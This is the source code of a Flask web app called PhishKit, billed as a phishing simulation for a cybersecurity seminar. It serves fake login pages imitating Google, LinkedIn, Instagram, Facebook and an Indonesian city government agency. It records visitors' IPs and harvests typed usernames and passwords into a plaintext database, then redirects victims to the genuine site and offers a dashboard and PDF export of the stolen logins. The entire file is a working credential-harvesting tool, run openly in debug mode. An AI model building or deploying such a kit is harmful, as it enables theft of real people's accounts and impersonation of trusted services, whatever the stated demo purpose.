import os, json, sqlite3
from datetime import datetime
from io import BytesIO
from flask import Flask, render_template, request, jsonify, redirect, send_file

app = Flask(__name__)
app.secret_key = 'phishkit-demo-2026'

BASE_DIR = os.path.dirname(__file__)
DB_PATH = os.path.join(BASE_DIR, 'data', 'phishkit.db')

TEMPLATES = {
    'google':    {'name': 'Google',    'redirect': 'https://mail.google.com'},
    'linkedin':  {'name': 'LinkedIn',  'redirect': 'https://www.linkedin.com'},
    'instagram': {'name': 'Instagram', 'redirect': 'https://www.instagram.com'},
    'facebook':  {'name': 'Facebook',  'redirect': 'https://www.facebook.com'},
    'bpksdm':    {'name': 'BPKSDM Kota Bekasi', 'redirect': 'https://www.bekasikota.go.id'},
}

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = get_db()
    conn.executescript('''
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            template TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            template TEXT,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT
        );
    ''')
    conn.execute('INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)',
                 ('active_template', 'google'))
    conn.commit()
    conn.close()

def parse_browser(ua):
    if 'Chrome' in ua and 'Edg' not in ua and 'OPR' not in ua:
        return 'Chrome'
    if 'Edg' in ua:
        return 'Edge'
    if 'Firefox' in ua:
        return 'Firefox'
    if 'Safari' in ua:
        return 'Safari'
    if 'OPR' in ua:
        return 'Opera'
    return 'Lainnya'

init_db()

@app.route('/')
def index():
    conn = get_db()
    active = conn.execute('SELECT value FROM config WHERE key = ?',
                          ('active_template',)).fetchone()
    conn.close()
    tpl = active['value'] if active else 'google'
    return redirect(f'/phish/{tpl}')

@app.route('/selector')
def selector():
    return render_template('selector.html', templates=TEMPLATES)

@app.route('/phish/<template_name>')
def phish_page(template_name):
    if template_name not in TEMPLATES:
        return 'Template not found', 404
    conn = get_db()
    conn.execute('INSERT INTO visitors (template, ip, user_agent) VALUES (?, ?, ?)',
                 (template_name, request.remote_addr, request.headers.get('User-Agent', '')))
    conn.commit()
    conn.close()
    return render_template(f'{template_name}.html', template_name=template_name)

@app.route('/capture', methods=['POST'])
def capture():
    tpl = request.form.get('template', 'unknown')
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    redirect_url = TEMPLATES.get(tpl, {}).get('redirect', '/')
    conn = get_db()
    conn.execute('INSERT INTO captures (template, username, password, ip, user_agent) VALUES (?, ?, ?, ?, ?)',
                 (tpl, username, password, request.remote_addr, request.headers.get('User-Agent', '')))
    conn.commit()
    conn.close()
    return redirect(redirect_url)

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard/live.html', templates=TEMPLATES)

@app.route('/edukasi')
def edukasi():
    return render_template('dashboard/edukasi.html')

@app.route('/api/stats')
def api_stats():
    conn = get_db()
    visitors = [dict(r) for r in conn.execute('SELECT * FROM visitors ORDER BY id DESC LIMIT 50').fetchall()]
    captures = [dict(r) for r in conn.execute('SELECT * FROM captures ORDER BY id DESC LIMIT 50').fetchall()]
    total_v = conn.execute('SELECT COUNT(*) as c FROM visitors').fetchone()['c']
    total_c = conn.execute('SELECT COUNT(*) as c FROM captures').fetchone()['c']
    vt = {r['template']: r['c'] for r in conn.execute('SELECT template, COUNT(*) as c FROM visitors GROUP BY template').fetchall()}
    ct = {r['template']: r['c'] for r in conn.execute('SELECT template, COUNT(*) as c FROM captures GROUP BY template').fetchall()}
    browsers = {}
    for v in visitors:
        b = parse_browser(v['user_agent'])
        browsers[b] = browsers.get(b, 0) + 1
    conn.close()
    return jsonify(total_visitors=total_v, total_captures=total_c,
                   visitors=visitors, captures=captures,
                   visitor_by_template=vt, capture_by_template=ct,
                   browsers=browsers)

@app.route('/api/active-template')
def api_active_template():
    conn = get_db()
    row = conn.execute('SELECT value FROM config WHERE key = ?',
                       ('active_template',)).fetchone()
    conn.close()
    return jsonify(template=row['value'] if row else 'google')

@app.route('/api/set-template', methods=['POST'])
def api_set_template():
    tpl = request.json.get('template', '')
    if tpl not in TEMPLATES:
        return jsonify(status='error', message='Template not found'), 400
    conn = get_db()
    conn.execute('UPDATE config SET value = ? WHERE key = ?',
                 (tpl, 'active_template'))
    conn.commit()
    conn.close()
    return jsonify(status='ok', template=tpl)

@app.route('/api/reset', methods=['POST'])
def api_reset():
    conn = get_db()
    conn.execute('DELETE FROM visitors')
    conn.execute('DELETE FROM captures')
    conn.commit()
    conn.close()
    return jsonify(status='ok')

@app.route('/api/export')
def api_export():
    from report.generator import generate_report
    conn = get_db()
    visitors = [dict(r) for r in conn.execute('SELECT * FROM visitors ORDER BY id DESC').fetchall()]
    captures = [dict(r) for r in conn.execute('SELECT * FROM captures ORDER BY id DESC').fetchall()]
    conn.close()
    pdf = generate_report(visitors, captures)
    return send_file(pdf, mimetype='application/pdf', as_attachment=True,
                     download_name=f'phishkit-report-{datetime.now().strftime("%Y%m%d-%H%M")}.pdf')

if __name__ == '__main__':
    import signal, sys
    def cleanup(sig=None, frame=None):
        print("\n" + "=" * 50)
        print("  Membersihkan data sesi...")
        try:
            conn = get_db()
            conn.execute('DELETE FROM visitors')
            conn.execute('DELETE FROM captures')
            conn.commit()
            conn.close()
            if os.path.exists(DB_PATH):
                os.remove(DB_PATH)
            print("  Semua data berhasil dihapus.")
        except Exception:
            pass
        print("  PhishKit selesai. Sampai jumpa!")
        print("=" * 50)
        sys.exit(0)
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    print("=" * 50)
    print("  PHISHKIT — Phishing Simulation Toolkit")
    print("  Cybersecurity Seminar Demo")
    print("=" * 50)
    print(f"  Dashboard:  http://127.0.0.1:2080/dashboard")
    print(f"  Selector:   http://127.0.0.1:2080/selector")
    print(f"  Share URL:  http://<IP_LAPTOP_ANDA>:2080  (otomatis ke template aktif)")
    print(f"  Share URL:  https://phiskit.bagasproject.my.id")
    print(f"  Tekan Ctrl+C untuk menghentikan server dan menghapus data")
    print("=" * 50)
    try:
        app.run(host='0.0.0.0', port=2080, debug=True, use_reloader=False)
    except KeyboardInterrupt:
        cleanup()
